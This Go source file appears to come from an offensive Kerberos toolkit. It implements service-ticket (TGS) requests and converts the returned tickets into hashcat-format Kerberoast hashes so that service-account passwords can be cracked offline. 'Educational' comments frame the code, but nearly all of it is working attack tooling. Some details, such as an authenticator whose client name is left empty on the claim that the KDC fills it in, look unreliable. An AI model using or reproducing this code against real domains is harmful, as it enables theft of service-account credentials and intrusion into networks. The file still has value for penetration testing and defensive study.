package client

import (
	"context"
	"encoding/asn1"
	"fmt"
	"time"

	"github.com/goobeus/goobeus/pkg/asn1krb5"
	"github.com/goobeus/goobeus/pkg/crypto"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: TGS Exchange - Getting Service Tickets
//
// The TGS (Ticket Granting Service) exchange uses your TGT to get
// service tickets for specific services. This is Kerberos step 2.
//
// Flow:
//   1. Build TGS-REQ with:
//      - Target service (SPN)
//      - Your TGT (encrypted, in the request)
//      - Authenticator (proves you have the session key)
//   2. Send to KDC
//   3. Receive TGS-REP with:
//      - Service ticket (encrypted with service's key)
//      - New session key (for use with the service)
//
// Why this matters for attacks:
// - Kerberoasting: Request tickets for any SPN, crack offline
// - The service ticket is encrypted with the SERVICE's key
// - If they use RC4, that key is their NTLM hash!

// TGSRequest configures a service ticket request.
type TGSRequest struct {
	// The TGT to use (from AskTGT)
	TGT        *ticket.Kirbi
	SessionKey []byte // Session key for the TGT

	// Target service
	Service string // SPN like "cifs/server.domain.com" or "MSSQLSvc/sql01:1433"
	Domain  string // Target realm (usually same as TGT realm)

	// Options
	Etype int32 // Preferred etype for service ticket (0 = auto)

	// Connection
	KDC string // Explicit KDC (auto-discovered if empty)
}

// TGSResult contains the result of a service ticket request.
type TGSResult struct {
	*SessionInfo
	Kirbi  *ticket.Kirbi
	Base64 string

	// For Kerberoasting - raw encrypted ticket for cracking
	Hash string // Hashcat format
}

// AskTGS requests a service ticket using an existing TGT.
//
// EDUCATIONAL: Service Ticket Request
//
// This is also known as the TGS exchange:
//  1. We include our TGT in the request (PA-TGS-REQ padata)
//  2. We prove we have the TGT session key with an Authenticator
//  3. KDC validates TGT, issues service ticket
//
// For Kerberoasting:
//   - We request tickets for accounts with SPNs
//   - The ticket is encrypted with their password hash
//   - We extract and crack it offline
func AskTGS(req *TGSRequest) (*TGSResult, error) {
	return AskTGSWithContext(context.Background(), req)
}

// AskTGSWithContext requests a service ticket with context support.
func AskTGSWithContext(ctx context.Context, req *TGSRequest) (*TGSResult, error) {
	if req.TGT == nil || req.TGT.Ticket() == nil {
		return nil, fmt.Errorf("TGT is required")
	}
	if req.Service == "" {
		return nil, fmt.Errorf("service is required")
	}
	if len(req.SessionKey) == 0 {
		// Try to get from TGT
		if key := req.TGT.SessionKey(); key != nil {
			req.SessionKey = key.KeyValue
		} else {
			return nil, fmt.Errorf("session key is required")
		}
	}

	// Parse service name
	sname := parseServiceName(req.Service)

	// Get domain from TGT or request
	domain := req.Domain
	if domain == "" && req.TGT.CredInfo != nil && len(req.TGT.CredInfo.TicketInfo) > 0 {
		domain = req.TGT.CredInfo.TicketInfo[0].SRealm
	}
	if domain == "" {
		return nil, fmt.Errorf("domain is required")
	}

	// Determine etype from session key
	etype := req.Etype
	if etype == 0 {
		etype = detectEtype(req.SessionKey)
	}

	// Create client
	client := NewClient(domain).WithKDC(req.KDC)

	// Build TGS-REQ
	tgsReq, err := buildTGSREQ(req, sname, domain, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to build TGS-REQ: %w", err)
	}

	// Build authenticator and add PA-TGS-REQ
	paTGSReq, err := buildPATGSReq(req.TGT.Ticket(), req.SessionKey, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to build PA-TGS-REQ: %w", err)
	}
	tgsReq.PAData = append(tgsReq.PAData, paTGSReq)

	// Marshal and send
	tgsReqBytes, err := asn1.MarshalWithParams(tgsReq, "application,tag:12")
	if err != nil {
		return nil, fmt.Errorf("failed to marshal TGS-REQ: %w", err)
	}

	respBytes, err := client.send(ctx, tgsReqBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to send TGS-REQ: %w", err)
	}

	// Check for error response
	if err := checkKRBError(respBytes); err != nil {
		return nil, err
	}

	// Parse TGS-REP
	var tgsRep asn1krb5.TGSREP
	_, err = asn1.UnmarshalWithParams(respBytes, &tgsRep, "application,tag:13")
	if err != nil {
		return nil, fmt.Errorf("failed to parse TGS-REP: %w", err)
	}

	// Decrypt the enc-part to get session key
	decrypted, err := decryptEncPart(tgsRep.EncPart, req.SessionKey, etype, crypto.KeyUsageTGSRepEncPart)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt TGS-REP enc-part: %w", err)
	}

	// Parse decrypted content
	var encPart asn1krb5.EncTGSRepPart
	_, err = asn1.UnmarshalWithParams(decrypted, &encPart, "application,tag:26")
	if err != nil {
		return nil, fmt.Errorf("failed to parse EncTGSRepPart: %w", err)
	}

	// Build kirbi from service ticket
	kirbi, err := buildKirbiFromTGS(&tgsRep.Ticket, &encPart)
	if err != nil {
		return nil, fmt.Errorf("failed to build kirbi: %w", err)
	}

	// Get base64
	b64, _ := kirbi.ToBase64()

	// Generate Kerberoast hash
	hash := generateKerberoastHash(&tgsRep.Ticket, req.Service)

	return &TGSResult{
		SessionInfo: &SessionInfo{
			SessionKey:  encPart.Key,
			Ticket:      &tgsRep.Ticket,
			Kirbi:       kirbi,
			AuthTime:    encPart.AuthTime,
			StartTime:   encPart.StartTime,
			EndTime:     encPart.EndTime,
			RenewTill:   encPart.RenewTill,
			ServerRealm: encPart.SRealm,
			ServerName:  encPart.SName,
		},
		Kirbi:  kirbi,
		Base64: b64,
		Hash:   hash,
	}, nil
}

// buildTGSREQ constructs a TGS-REQ message.
func buildTGSREQ(req *TGSRequest, sname asn1krb5.PrincipalName, domain string, etype int32) (*asn1krb5.TGSREQ, error) {
	now := time.Now().UTC()

	// KDC options
	options := asn1krb5.FlagForwardable | asn1krb5.FlagRenewable | asn1krb5.FlagProxiable

	optionsBits := make([]byte, 4)
	optionsBits[0] = byte((options >> 24) & 0xFF)
	optionsBits[1] = byte((options >> 16) & 0xFF)
	optionsBits[2] = byte((options >> 8) & 0xFF)
	optionsBits[3] = byte(options & 0xFF)

	// Build request body
	body := asn1krb5.KDCReqBody{
		KDCOptions: asn1.BitString{
			Bytes:     optionsBits,
			BitLength: 32,
		},
		Realm: domain,
		SName: sname,
		Till:  now.Add(10 * time.Hour),
		Nonce: int32(now.UnixNano() & 0x7FFFFFFF),
		EType: []int32{etype, crypto.EtypeAES256, crypto.EtypeAES128, crypto.EtypeRC4},
	}

	return &asn1krb5.TGSREQ{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeTGSREQ,
		ReqBody: body,
	}, nil
}

// buildPATGSReq builds the PA-TGS-REQ padata with authenticator.
func buildPATGSReq(tgt *asn1krb5.Ticket, sessionKey []byte, etype int32) (asn1krb5.PAData, error) {
	// Build authenticator
	auth, err := buildAuthenticator(sessionKey, etype)
	if err != nil {
		return asn1krb5.PAData{}, err
	}

	// Build AP-REQ with TGT and authenticator
	apReq := asn1krb5.APREQ{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeAPREQ,
		APOptions: asn1.BitString{
			Bytes:     []byte{0, 0, 0, 0},
			BitLength: 32,
		},
		Ticket:        *tgt,
		Authenticator: auth,
	}

	apReqBytes, err := asn1.MarshalWithParams(apReq, "application,tag:14")
	if err != nil {
		return asn1krb5.PAData{}, err
	}

	return asn1krb5.PAData{
		PADataType:  asn1krb5.PADataTGSReq,
		PADataValue: apReqBytes,
	}, nil
}

// buildAuthenticator creates an encrypted authenticator.
func buildAuthenticator(sessionKey []byte, etype int32) (asn1krb5.EncryptedData, error) {
	now := time.Now().UTC()

	// Authenticator structure
	auth := asn1krb5.Authenticator{
		AuthenticatorVno: 5,
		CRealm:           "", // Will be filled by KDC
		CName: asn1krb5.PrincipalName{
			NameType:   asn1krb5.NTPrincipal,
			NameString: []string{},
		},
		CTime: now,
		CUsec: int32(now.Nanosecond() / 1000),
	}

	authBytes, err := asn1.MarshalWithParams(auth, "application,tag:2")
	if err != nil {
		return asn1krb5.EncryptedData{}, err
	}

	// Encrypt
	var encrypted []byte
	switch etype {
	case crypto.EtypeRC4:
		encrypted, err = crypto.EncryptRC4(sessionKey, authBytes, crypto.KeyUsageTGSReqPAData)
	case crypto.EtypeAES128, crypto.EtypeAES256:
		encrypted, err = crypto.EncryptAES(sessionKey, authBytes, crypto.KeyUsageTGSReqPAData, int(etype))
	default:
		return asn1krb5.EncryptedData{}, fmt.Errorf("unsupported etype: %d", etype)
	}
	if err != nil {
		return asn1krb5.EncryptedData{}, err
	}

	return asn1krb5.EncryptedData{
		EType:  etype,
		Cipher: encrypted,
	}, nil
}

// parseServiceName parses an SPN into a PrincipalName.
func parseServiceName(spn string) asn1krb5.PrincipalName {
	// SPN format: service/host or service/host:port
	parts := splitSPN(spn)
	return asn1krb5.PrincipalName{
		NameType:   asn1krb5.NTSrvInst,
		NameString: parts,
	}
}

// splitSPN splits an SPN into components.
func splitSPN(spn string) []string {
	// Handle "service/host" or "service/host:port"
	result := []string{}
	current := ""
	for _, c := range spn {
		if c == '/' && len(result) == 0 {
			result = append(result, current)
			current = ""
		} else {
			current += string(c)
		}
	}
	if current != "" {
		result = append(result, current)
	}
	return result
}

// detectEtype guesses etype from key length.
func detectEtype(key []byte) int32 {
	switch len(key) {
	case 16:
		return crypto.EtypeRC4 // Could also be AES128
	case 32:
		return crypto.EtypeAES256
	default:
		return crypto.EtypeRC4
	}
}

// buildKirbiFromTGS creates a Kirbi from a service ticket.
func buildKirbiFromTGS(tkt *asn1krb5.Ticket, encPart *asn1krb5.EncTGSRepPart) (*ticket.Kirbi, error) {
	credInfo := asn1krb5.EncKRBCredPart{
		TicketInfo: []asn1krb5.KRBCredInfo{
			{
				Key:       encPart.Key,
				PRealm:    encPart.SRealm,
				AuthTime:  encPart.AuthTime,
				StartTime: encPart.StartTime,
				EndTime:   encPart.EndTime,
				RenewTill: encPart.RenewTill,
				SRealm:    encPart.SRealm,
				SName:     encPart.SName,
			},
		},
	}

	credInfoBytes, err := asn1.MarshalWithParams(&credInfo, "application,tag:29")
	if err != nil {
		return nil, err
	}

	krbCred := &asn1krb5.KRBCred{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeKRBCred,
		Tickets: []asn1krb5.Ticket{*tkt},
		EncPart: asn1krb5.EncryptedData{
			EType:  0,
			Cipher: credInfoBytes,
		},
	}

	return &ticket.Kirbi{
		Cred:     krbCred,
		CredInfo: &credInfo,
	}, nil
}

// generateKerberoastHash creates a hashcat-format hash from a service ticket.
//
// EDUCATIONAL: Kerberoast Hash Format
//
// Hashcat format for Kerberos TGS tickets:
// - Mode 13100 (RC4): $krb5tgs$23$*user$realm$spn*$checksum$edata2
// - Mode 19700 (AES256): $krb5tgs$18$user$realm$checksum$edata2
//
// The hash contains the encrypted ticket data, which is encrypted with
// the service account's password-derived key.
func generateKerberoastHash(tkt *asn1krb5.Ticket, spn string) string {
	// Extract components
	etype := tkt.EncPart.EType
	cipher := tkt.EncPart.Cipher
	realm := tkt.Realm

	if len(cipher) < 16 {
		return ""
	}

	switch etype {
	case 23: // RC4
		// $krb5tgs$23$*user$realm$spn*$checksum$edata2
		checksum := fmt.Sprintf("%x", cipher[:16])
		edata2 := fmt.Sprintf("%x", cipher[16:])
		return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s",
			"user", realm, spn, checksum, edata2)
	case 17, 18: // AES
		// $krb5tgs$18$user$realm$checksum$edata2
		checksumLen := 12
		if len(cipher) <= checksumLen {
			return ""
		}
		checksum := fmt.Sprintf("%x", cipher[len(cipher)-checksumLen:])
		edata2 := fmt.Sprintf("%x", cipher[:len(cipher)-checksumLen])
		return fmt.Sprintf("$krb5tgs$%d$%s$%s$*%s*$%s$%s",
			etype, "user", realm, spn, checksum, edata2)
	}

	return ""
}
